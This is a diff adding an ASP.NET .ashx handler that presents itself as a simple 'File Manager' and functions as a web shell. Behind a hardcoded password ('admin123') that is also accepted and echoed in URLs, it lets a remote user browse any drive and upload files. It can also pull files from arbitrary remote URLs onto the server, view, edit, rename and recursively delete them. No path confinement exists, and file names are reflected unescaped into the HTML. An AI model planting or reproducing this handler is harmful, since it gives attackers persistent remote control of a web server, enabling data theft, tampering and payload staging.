@@ -1,0 +1,444 @@
+<%@ WebHandler Language="C#" Class="FileManager" %>
+
+using System;
+using System.Web;
+using System.IO;
+using System.Text;
+using System.Collections;
+using System.Text.RegularExpressions;
+using System.Net;
+
+public class FileManager : IHttpHandler {
+    
+    private string currentDir = "";
+    private string rootDir = "";
+    private string action = "";
+    private string target = "";
+    private string content = "";
+    private string newName = "";
+    private string newContent = "";
+    private string remoteUrl = "";
+    private string password = "admin123"; // Change this to your preferred password
+    
+    public void ProcessRequest(HttpContext context) {
+        context.Response.ContentType = "text/html";
+        
+        // Check for authentication
+        if (context.Request.Form["pass"] != password && context.Request.QueryString["pass"] != password) {
+            ShowLoginForm(context);
+            return;
+        }
+        
+        // Initialize file manager
+        InitializeFileManager(context);
+        
+        // Process the requested action
+        ProcessAction(context);
+        
+        // Show the file manager interface
+        ShowFileManagerInterface(context);
+    }
+    
+    private void InitializeFileManager(HttpContext context) {
+        // Set the root directory to the web root by default
+        rootDir = context.Server.MapPath("/");
+        
+        // Get current directory from query string or form
+        if (!string.IsNullOrEmpty(context.Request.QueryString["dir"])) {
+            currentDir = context.Request.QueryString["dir"];
+        } else if (!string.IsNullOrEmpty(context.Request.Form["dir"])) {
+            currentDir = context.Request.Form["dir"];
+        } else {
+            currentDir = rootDir;
+        }
+        
+        // Normalize directory path - handle drive root paths
+        if (!string.IsNullOrEmpty(currentDir) && currentDir.Length >= 2 && currentDir[1] == ':') {
+            // This is a drive path like C: or D:
+            if (!currentDir.EndsWith("\\")) {
+                currentDir += "\\";
+            }
+        } else if (!string.IsNullOrEmpty(currentDir) && !currentDir.EndsWith("\\")) {
+            currentDir += "\\";
+        }
+        
+        // Get action from query string or form
+        if (!string.IsNullOrEmpty(context.Request.QueryString["action"])) {
+            action = context.Request.QueryString["action"];
+        } else if (!string.IsNullOrEmpty(context.Request.Form["action"])) {
+            action = context.Request.Form["action"];
+        }
+        
+        // Get target file/folder from query string or form
+        if (!string.IsNullOrEmpty(context.Request.QueryString["target"])) {
+            target = context.Request.QueryString["target"];
+        } else if (!string.IsNullOrEmpty(context.Request.Form["target"])) {
+            target = context.Request.Form["target"];
+        }
+        
+        // Get content for file operations
+        if (!string.IsNullOrEmpty(context.Request.Form["content"])) {
+            content = context.Request.Form["content"];
+        }
+        
+        // Get new name for rename operations
+        if (!string.IsNullOrEmpty(context.Request.Form["newname"])) {
+            newName = context.Request.Form["newname"];
+        }
+        
+        // Get new content for edit operations
+        if (!string.IsNullOrEmpty(context.Request.Form["newcontent"])) {
+            newContent = context.Request.Form["newcontent"];
+        }
+        
+        // Get remote URL for download operations
+        if (!string.IsNullOrEmpty(context.Request.Form["remoteurl"])) {
+            remoteUrl = context.Request.Form["remoteurl"];
+        }
+    }
+    
+    private void ProcessAction(HttpContext context) {
+        string fullPath = "";
+        
+        switch (action) {
+            case "upload":
+                if (context.Request.Files.Count > 0) {
+                    HttpPostedFile file = context.Request.Files[0];
+                    if (file.ContentLength > 0) {
+                        string fileName = Path.GetFileName(file.FileName);
+                        string savePath = Path.Combine(currentDir, fileName);
+                        file.SaveAs(savePath);
+                    }
+                }
+                break;
+            
+            case "download":
+                if (!string.IsNullOrEmpty(remoteUrl)) {
+                    try {
+                        using (WebClient client = new WebClient()) {
+                            string fileName = Path.GetFileName(remoteUrl);
+                            if (string.IsNullOrEmpty(fileName)) {
+                                fileName = "downloadedfile_" + DateTime.Now.ToString("yyyyMMdd_HHmmss");
+                            }
+                            if (!string.IsNullOrEmpty(target) && target.Trim() != "") {
+                                fileName = target;
+                            }
+                            string savePath = Path.Combine(currentDir, fileName);
+                            client.DownloadFile(remoteUrl, savePath);
+                        }
+                    } catch (Exception) {
+                        // Handle download errors silently
+                    }
+                }
+                break;
+                
+            case "delete":
+                fullPath = Path.Combine(currentDir, target);
+                if (File.Exists(fullPath)) {
+                    File.Delete(fullPath);
+                } else if (Directory.Exists(fullPath)) {
+                    Directory.Delete(fullPath, true);
+                }
+                break;
+                
+            case "rename":
+                fullPath = Path.Combine(currentDir, target);
+                string newPath = Path.Combine(currentDir, newName);
+                if (File.Exists(fullPath)) {
+                    File.Move(fullPath, newPath);
+                } else if (Directory.Exists(fullPath)) {
+                    Directory.Move(fullPath, newPath);
+                }
+                break;
+                
+            case "edit":
+                fullPath = Path.Combine(currentDir, target);
+                if (File.Exists(fullPath)) {
+                    File.WriteAllText(fullPath, newContent);
+                }
+                break;
+                
+            case "create":
+                fullPath = Path.Combine(currentDir, target);
+                File.WriteAllText(fullPath, content);
+                break;
+                
+            case "createdir":
+                fullPath = Path.Combine(currentDir, target);
+                if (!Directory.Exists(fullPath)) {
+                    Directory.CreateDirectory(fullPath);
+                }
+                break;
+        }
+    }
+    
+    private void ShowLoginForm(HttpContext context) {
+        context.Response.Write(@"
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>File Manager - Login</title>
+            <style>
+                body { font-family: Arial, sans-serif; margin: 0; padding: 0; background-color: #f0f0f0; }
+                .login-container { width: 300px; margin: 100px auto; padding: 20px; background-color: #fff; border: 1px solid #ddd; border-radius: 5px; }
+                .login-container h2 { margin-top: 0; color: #333; }
+                .login-form input[type='password'] { width: 100%; padding: 8px; margin-bottom: 10px; border: 1px solid #ddd; border-radius: 3px; }
+                .login-form input[type='submit'] { padding: 8px 16px; background-color: #4CAF50; color: white; border: none; border-radius: 3px; cursor: pointer; }
+                .login-form input[type='submit']:hover { background-color: #45a049; }
+            </style>
+        </head>
+        <body>
+            <div class='login-container'>
+                <h2>File Manager Login</h2>
+                <form class='login-form' method='post'>
+                    <input type='password' name='pass' placeholder='Password' required>
+                    <input type='submit' value='Login'>
+                </form>
+            </div>
+        </body>
+        </html>
+        ");
+    }
+    
+    private string GetDriveNavigation() {
+        StringBuilder navHtml = new StringBuilder();
+        
+        navHtml.Append("<div class='drives-section' style='margin-bottom: 15px; padding: 10px; background-color: #f9f9f9; border: 1px solid #e0e0e0; border-radius: 3px;'>");
+        navHtml.Append("<strong>Quick Navigation: </strong>");
+        navHtml.Append("<a href='?action=&dir=C:\\&pass=" + password + "' style='margin-right: 15px; text-decoration: none; color: #4CAF50;'>C:\\</a>");
+        navHtml.Append("<a href='?action=&dir=D:\\&pass=" + password + "' style='margin-right: 15px; text-decoration: none; color: #4CAF50;'>D:\\</a>");
+        navHtml.Append("<a href='?action=&dir=E:\\&pass=" + password + "' style='margin-right: 15px; text-decoration: none; color: #4CAF50;'>E:\\</a>");
+        navHtml.Append("<a href='?action=&dir=F:\\&pass=" + password + "' style='margin-right: 15px; text-decoration: none; color: #4CAF50;'>F:\\</a>");
+        navHtml.Append("</div>");
+        
+        return navHtml.ToString();
+    }
+    
+    private void ShowFileManagerInterface(HttpContext context) {
+        StringBuilder html = new StringBuilder();
+        
+        html.Append(@"
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>File Manager</title>
+            <style>
+                body { font-family: Arial, sans-serif; margin: 0; padding: 0; background-color: #f0f0f0; }
+                .container { width: 90%; margin: 20px auto; background-color: #fff; border: 1px solid #ddd; border-radius: 5px; padding: 20px; }
+                .header { margin-bottom: 20px; padding-bottom: 10px; border-bottom: 1px solid #ddd; }
+                .nav { margin-bottom: 20px; }
+                .nav a { margin-right: 10px; text-decoration: none; color: #4CAF50; }
+                .nav a:hover { text-decoration: underline; }
+                .actions { margin-bottom: 20px; }
+                .actions form { display: inline-block; margin-right: 20px; margin-bottom: 10px; }
+                .actions input[type='text'], .actions input[type='file'] { padding: 5px; border: 1px solid #ddd; border-radius: 3px; }
+                .actions input[type='submit'] { padding: 5px 10px; background-color: #4CAF50; color: white; border: none; border-radius: 3px; cursor: pointer; }
+                .actions input[type='submit']:hover { background-color: #45a049; }
+                table { width: 100%; border-collapse: collapse; }
+                table th, table td { padding: 8px; text-align: left; border-bottom: 1px solid #ddd; }
+                table th { background-color: #f2f2f2; }
+                table tr:hover { background-color: #f5f5f5; }
+                .file-actions a { margin-right: 5px; text-decoration: none; color: #4CAF50; }
+                .file-actions a:hover { text-decoration: underline; }
+                .editor { margin-top: 20px; }
+                .editor textarea { width: 100%; height: 400px; padding: 10px; border: 1px solid #ddd; border-radius: 3px; }
+                .editor input[type='submit'] { padding: 8px 16px; background-color: #4CAF50; color: white; border: none; border-radius: 3px; cursor: pointer; margin-top: 10px; }
+                .editor input[type='submit']:hover { background-color: #45a049; }
+            </style>
+        </head>
+        <body>
+            <div class='container'>
+                <div class='header'>
+                    <h1>File Manager</h1>
+                    <p>Current Directory: " + currentDir + @"</p>
+                </div>
+        ");
+        
+        // Add drives section
+        html.Append(GetDriveNavigation());
+        
+        // Navigation
+        html.Append(@"
+                <div class='nav'>
+                    <a href='?action=&dir=" + rootDir + "&pass=" + password + @"'>Root</a>
+        ");
+        
+        // Show parent directory link if not at root
+        if (currentDir != rootDir) {
+            DirectoryInfo parentDirInfo = Directory.GetParent(currentDir);
+            if (parentDirInfo != null) {
+                string parentDir = parentDirInfo.FullName;
+                html.Append("<a href='?action=&dir=" + parentDir + "&pass=" + password + "'>Parent Directory</a>");
+            }
+        }
+        
+        html.Append(@"
+                </div>
+        ");
+        
+        // Display file upload, remote download, create file/directory forms
+        html.Append(@"
+                <div class='actions'>
+                    <form method='post' enctype='multipart/form-data'>
+                        <input type='hidden' name='action' value='upload'>
+                        <input type='hidden' name='dir' value='" + currentDir + @"'>
+                        <input type='hidden' name='pass' value='" + password + @"'>
+                        <input type='file' name='file'>
+                        <input type='submit' value='Upload'>
+                    </form>
+                    
+                    <form method='post'>
+                        <input type='hidden' name='action' value='download'>
+                        <input type='hidden' name='dir' value='" + currentDir + @"'>
+                        <input type='hidden' name='pass' value='" + password + @"'>
+                        <input type='text' name='remoteurl' placeholder='Remote URL' style='width:250px;'>
+                        <input type='text' name='target' placeholder='Save as (optional)'>
+                        <input type='submit' value='Download File'>
+                    </form>
+                    
+                    <form method='post'>
+                        <input type='hidden' name='action' value='create'>
+                        <input type='hidden' name='dir' value='" + currentDir + @"'>
+                        <input type='hidden' name='pass' value='" + password + @"'>
+                        <input type='text' name='target' placeholder='File Name'>
+                        <input type='text' name='content' placeholder='File Content'>
+                        <input type='submit' value='Create File'>
+                    </form>
+                    
+                    <form method='post'>
+                        <input type='hidden' name='action' value='createdir'>
+                        <input type='hidden' name='dir' value='" + currentDir + @"'>
+                        <input type='hidden' name='pass' value='" + password + @"'>
+                        <input type='text' name='target' placeholder='Directory Name'>
+                        <input type='submit' value='Create Directory'>
+                    </form>
+                </div>
+        ");
+        
+        // View/Edit file
+        if (action == "view" || action == "editform") {
+            string filePath = Path.Combine(currentDir, target);
+            if (File.Exists(filePath)) {
+                string fileContent = File.ReadAllText(filePath);
+                
+                html.Append(@"
+                    <div class='editor'>
+                        <h3>" + (action == "view" ? "View File: " : "Edit File: ") + target + @"</h3>
+                        <form method='post'>
+                            <input type='hidden' name='action' value='edit'>
+                            <input type='hidden' name='dir' value='" + currentDir + @"'>
+                            <input type='hidden' name='pass' value='" + password + @"'>
+                            <input type='hidden' name='target' value='" + target + @"'>
+                            <textarea name='newcontent'" + (action == "view" ? " readonly" : "") + @">" + HttpUtility.HtmlEncode(fileContent) + @"</textarea>
+                            " + (action == "editform" ? "<input type='submit' value='Save Changes'>" : "") + @"
+                        </form>
+                    </div>
+                ");
+            }
+        }
+        
+        // List files and directories
+        html.Append(@"
+                <table>
+                    <tr>
+                        <th>Name</th>
+                        <th>Type</th>
+                        <th>Size</th>
+                        <th>Last Modified</th>
+                        <th>Actions</th>
+                    </tr>
+        ");
+        
+        try {
+            // Add directories
+            string[] directories = Directory.GetDirectories(currentDir);
+            foreach (string dir in directories) {
+                DirectoryInfo dirInfo = new DirectoryInfo(dir);
+                string dirName = dirInfo.Name;
+                
+                html.Append(@"
+                    <tr>
+                        <td><a href='?action=&dir=" + dir + "&pass=" + password + "'>" + dirName + @"</a></td>
+                        <td>Directory</td>
+                        <td>--</td>
+                        <td>" + dirInfo.LastWriteTime + @"</td>
+                        <td class='file-actions'>
+                            <a href='?action=delete&dir=" + currentDir + "&target=" + dirName + "&pass=" + password + @"' onclick='return confirm(""Are you sure you want to delete this directory?"");'>Delete</a>
+                            <a href='#' onclick='renameDir(""" + dirName + @""");'>Rename</a>
+                        </td>
+                    </tr>
+                ");
+            }
+            
+            // Add files
+            string[] files = Directory.GetFiles(currentDir);
+            foreach (string file in files) {
+                FileInfo fileInfo = new FileInfo(file);
+                string fileName = fileInfo.Name;
+                
+                html.Append(@"
+                    <tr>
+                        <td>" + fileName + @"</td>
+                        <td>File</td>
+                        <td>" + FormatFileSize(fileInfo.Length) + @"</td>
+                        <td>" + fileInfo.LastWriteTime + @"</td>
+                        <td class='file-actions'>
+                            <a href='?action=view&dir=" + currentDir + "&target=" + fileName + "&pass=" + password + @"'>View</a>
+                            <a href='?action=editform&dir=" + currentDir + "&target=" + fileName + "&pass=" + password + @"'>Edit</a>
+                            <a href='?action=delete&dir=" + currentDir + "&target=" + fileName + "&pass=" + password + @"' onclick='return confirm(""Are you sure you want to delete this file?"");'>Delete</a>
+                            <a href='#' onclick='renameFile(""" + fileName + @""");'>Rename</a>
+                        </td>
+                    </tr>
+                ");
+            }
+        } catch (Exception ex) {
+            html.Append(@"
+                    <tr>
+                        <td colspan='5'>Error: " + ex.Message + @"</td>
+                    </tr>
+            ");
+        }
+        
+        html.Append(@"
+                </table>
+                
+                <script>
+                    function renameFile(fileName) {
+                        var newName = prompt('Enter new name for ' + fileName + ':', fileName);
+                        if (newName != null && newName != '') {
+                            window.location = '?action=rename&dir=" + currentDir + "&target=' + fileName + '&newname=' + newName + '&pass=" + password + @"';
+                        }
+                    }
+                    
+                    function renameDir(dirName) {
+                        var newName = prompt('Enter new name for ' + dirName + ':', dirName);
+                        if (newName != null && newName != '') {
+                            window.location = '?action=rename&dir=" + currentDir + "&target=' + dirName + '&newname=' + newName + '&pass=" + password + @"';
+                        }
+                    }
+                </script>
+            </div>
+        </body>
+        </html>
+        ");
+        
+        context.Response.Write(html.ToString());
+    }
+    
+    private string FormatFileSize(long bytes) {
+        string[] sizes = { "B", "KB", "MB", "GB", "TB" };
+        double len = bytes;
+        int order = 0;
+        while (len >= 1024 && order < sizes.Length - 1) {
+            order++;
+            len = len / 1024;
+        }
+        return String.Format("{0:0.##} {1}", len, sizes[order]);
+    }
+    
+    public bool IsReusable {
+        get {
+            return false;
+        }
+    }
+}
